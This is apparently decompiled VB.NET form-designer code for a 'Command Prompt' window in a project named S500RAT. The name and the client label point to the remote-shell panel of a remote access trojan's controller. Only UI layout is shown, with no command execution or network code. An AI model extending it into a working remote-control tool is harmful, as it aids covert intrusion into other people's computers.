Namespace S500RAT
	' Token: 0x02000015 RID: 21
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class FormCMD
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x060001B8 RID: 440 RVA: 0x0000D970 File Offset: 0x0000BB70
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x060001B9 RID: 441 RVA: 0x0000D9C0 File Offset: 0x0000BBC0
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Me.components = New Global.System.ComponentModel.Container()
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.S500RAT.FormCMD))
			Me.UiLabel1 = New Global.Sunny.UI.UILabel()
			Me.ClientInfo = New Global.System.Windows.Forms.Label()
			Me.T1 = New Global.Sunny.UI.UIRichTextBox()
			Me.T2 = New Global.Guna.UI2.WinForms.Guna2TextBox()
			Me.Guna2ResizeBox1 = New Global.Guna.UI2.WinForms.Guna2ResizeBox()
			Me.Timer1 = New Global.System.Windows.Forms.Timer(Me.components)
			Me.Guna2DragControl1 = New Global.Guna.UI2.WinForms.Guna2DragControl(Me.components)
			Me.Guna2BorderlessForm1 = New Global.Guna.UI2.WinForms.Guna2BorderlessForm(Me.components)
			Me.Mini = New Global.S500RAT.ValleyMini()
			Me.MAX = New Global.S500RAT.ValleyMax()
			Me.ExitForm = New Global.S500RAT.ValleyClose()
			MyBase.SuspendLayout()
			Me.UiLabel1.AutoSize = True
			Me.UiLabel1.BackColor = Global.System.Drawing.Color.Transparent
			Me.UiLabel1.Font = New Global.System.Drawing.Font("Microsoft YaHei", 9.75F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.UiLabel1.ForeColor = Global.System.Drawing.Color.White
			Me.UiLabel1.Location = New Global.System.Drawing.Point(18, 8)
			Me.UiLabel1.Name = "UiLabel1"
			Me.UiLabel1.Size = New Global.System.Drawing.Size(133, 19)
			Me.UiLabel1.Style = Global.Sunny.UI.UIStyle.Custom
			Me.UiLabel1.TabIndex = 304
			Me.UiLabel1.Text = "Command Prompt"
			Me.UiLabel1.TextAlign = Global.System.Drawing.ContentAlignment.MiddleLeft
			Me.ClientInfo.AutoSize = True
			Me.ClientInfo.BackColor = Global.System.Drawing.Color.Transparent
			Me.ClientInfo.Font = New Global.System.Drawing.Font("Microsoft YaHei", 8.25F, Global.System.Drawing.FontStyle.Regular, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.ClientInfo.ForeColor = Global.System.Drawing.Color.FromArgb(141, 152, 172)
			Me.ClientInfo.Location = New Global.System.Drawing.Point(19, 32)
			Me.ClientInfo.Name = "ClientInfo"
			Me.ClientInfo.Size = New Global.System.Drawing.Size(200, 16)
			Me.ClientInfo.TabIndex = 305
			Me.ClientInfo.Text = "FC / Desktop_3424 / Windows 10 pro"
			Me.T1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.T1.AutoWordSelection = True
			Me.T1.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 48)
			Me.T1.FillColor = Global.System.Drawing.Color.FromArgb(7, 11, 48)
			Me.T1.FillColor2 = Global.System.Drawing.SystemColors.WindowFrame
			Me.T1.FillDisableColor = Global.System.Drawing.Color.Red
			Me.T1.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.T1.ForeColor = Global.System.Drawing.Color.White
			Me.T1.ForeDisableColor = Global.System.Drawing.Color.FromArgb(7, 11, 48)
			Me.T1.Location = New Global.System.Drawing.Point(12, 81)
			Me.T1.Margin = New Global.System.Windows.Forms.Padding(3, 5, 3, 5)
			Me.T1.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.T1.Name = "T1"
			Me.T1.Padding = New Global.System.Windows.Forms.Padding(2)
			Me.T1.Radius = 8
			Me.T1.[ReadOnly] = True
			Me.T1.RectColor = Global.System.Drawing.Color.FromArgb(7, 11, 48)
			Me.T1.Size = New Global.System.Drawing.Size(536, 229)
			Me.T1.Style = Global.Sunny.UI.UIStyle.Custom
			Me.T1.TabIndex = 309
			Me.T1.TextAlignment = Global.System.Drawing.ContentAlignment.MiddleCenter
			Me.T1.WordWrap = True
			Me.T2.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.T2.Animated = True
			Me.T2.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			Me.T2.BorderColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.T2.BorderRadius = 6
			Me.T2.BorderStyle = Global.System.Drawing.Drawing2D.DashStyle.Custom
			Me.T2.Cursor = Global.System.Windows.Forms.Cursors.IBeam
			Me.T2.DefaultText = ""
			Me.T2.DisabledState.BorderColor = Global.System.Drawing.Color.FromArgb(208, 208, 208)
			Me.T2.DisabledState.FillColor = Global.System.Drawing.Color.FromArgb(226, 226, 226)
			Me.T2.DisabledState.ForeColor = Global.System.Drawing.Color.FromArgb(138, 138, 138)
			Me.T2.DisabledState.Parent = Me.T2
			Me.T2.DisabledState.PlaceholderForeColor = Global.System.Drawing.Color.FromArgb(138, 138, 138)
			Me.T2.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.T2.FocusedState.BorderColor = Global.System.Drawing.Color.FromArgb(82, 43, 255)
			Me.T2.FocusedState.Parent = Me.T2
			Me.T2.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.T2.ForeColor = Global.System.Drawing.Color.White
			Me.T2.HoverState.BorderColor = Global.System.Drawing.Color.Magenta
			Me.T2.HoverState.Parent = Me.T2
			Me.T2.IconRightCursor = Global.System.Windows.Forms.Cursors.Hand
			Me.T2.Location = New Global.System.Drawing.Point(12, 316)
			Me.T2.Margin = New Global.System.Windows.Forms.Padding(3, 2, 3, 2)
			Me.T2.Name = "T2"
			Me.T2.PasswordChar = vbNullChar
			Me.T2.PlaceholderForeColor = Global.System.Drawing.Color.Gray
			Me.T2.PlaceholderText = "Command"
			Me.T2.SelectedText = ""
			Me.T2.ShadowDecoration.Parent = Me.T2
			Me.T2.Size = New Global.System.Drawing.Size(536, 26)
			Me.T2.TabIndex = 479
			Me.T2.TextAlign = Global.System.Windows.Forms.HorizontalAlignment.Center
			Me.Guna2ResizeBox1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Guna2ResizeBox1.BackColor = Global.System.Drawing.Color.Transparent
			Me.Guna2ResizeBox1.FillColor = Global.System.Drawing.Color.Silver
			Me.Guna2ResizeBox1.ForeColor = Global.System.Drawing.Color.Empty
			Me.Guna2ResizeBox1.Location = New Global.System.Drawing.Point(533, 347)
			Me.Guna2ResizeBox1.Name = "Guna2ResizeBox1"
			Me.Guna2ResizeBox1.Size = New Global.System.Drawing.Size(17, 19)
			Me.Guna2ResizeBox1.TabIndex = 310
			Me.Guna2ResizeBox1.TargetControl = Me
			Me.Guna2ResizeBox1.UseTransparentBackground = True
			Me.Timer1.Interval = 2000
			Me.Guna2DragControl1.ContainerControl = Me
			Me.Guna2DragControl1.DockForm = True
			Me.Guna2DragControl1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2DragControl1.DragMode = Global.Guna.UI2.WinForms.Enums.DragMode.Control
			Me.Guna2DragControl1.DragStartTransparencyValue = 0.6
			Me.Guna2DragControl1.TargetControl = Me
			Me.Guna2DragControl1.TransparentWhileDrag = True
			Me.Guna2DragControl1.UseTransparentDrag = True
			Me.Guna2BorderlessForm1.AnimateWindow = True
			Me.Guna2BorderlessForm1.BorderRadius = 40
			Me.Guna2BorderlessForm1.ContainerControl = Me
			Me.Guna2BorderlessForm1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.DragStartTransparencyValue = 0.6
			Me.Guna2BorderlessForm1.ShadowColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.TransparentWhileDrag = True
			Me.Mini.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Mini.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Mini.Location = New Global.System.Drawing.Point(476, 12)
			Me.Mini.Name = "Mini"
			Me.Mini.Size = New Global.System.Drawing.Size(20, 20)
			Me.Mini.TabIndex = 586
			Me.Mini.Text = "ValleyMini1"
			Me.MAX.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.MAX.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.MAX.Location = New Global.System.Drawing.Point(502, 12)
			Me.MAX.Name = "MAX"
			Me.MAX.Size = New Global.System.Drawing.Size(20, 20)
			Me.MAX.TabIndex = 585
			Me.MAX.Text = "ValleyMax1"
			Me.ExitForm.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.ExitForm.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.ExitForm.Location = New Global.System.Drawing.Point(528, 12)
			Me.ExitForm.Name = "ExitForm"
			Me.ExitForm.Size = New Global.System.Drawing.Size(20, 20)
			Me.ExitForm.TabIndex = 584
			Me.ExitForm.Text = "ValleyClose1"
			MyBase.AutoScaleDimensions = New Global.System.Drawing.SizeF(96F, 96F)
			MyBase.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Dpi
			Me.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			MyBase.ClientSize = New Global.System.Drawing.Size(560, 377)
			MyBase.Controls.Add(Me.Mini)
			MyBase.Controls.Add(Me.MAX)
			MyBase.Controls.Add(Me.ExitForm)
			MyBase.Controls.Add(Me.Guna2ResizeBox1)
			MyBase.Controls.Add(Me.T1)
			MyBase.Controls.Add(Me.T2)
			MyBase.Controls.Add(Me.UiLabel1)
			MyBase.Controls.Add(Me.ClientInfo)
			Me.DoubleBuffered = True
			Me.Font = New Global.System.Drawing.Font("Microsoft Sans Serif", 8.25F)
			Me.ForeColor = Global.System.Drawing.Color.White
			MyBase.FormBorderStyle = Global.System.Windows.Forms.FormBorderStyle.None
			MyBase.Icon = CType(componentResourceManager.GetObject("$this.Icon"), Global.System.Drawing.Icon)
			MyBase.Name = "FormCMD"
			Me.Text = "FormCMD"
			MyBase.TopMost = True
			MyBase.ResumeLayout(False)
			MyBase.PerformLayout()
		End Sub

		' Token: 0x040000C6 RID: 198
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
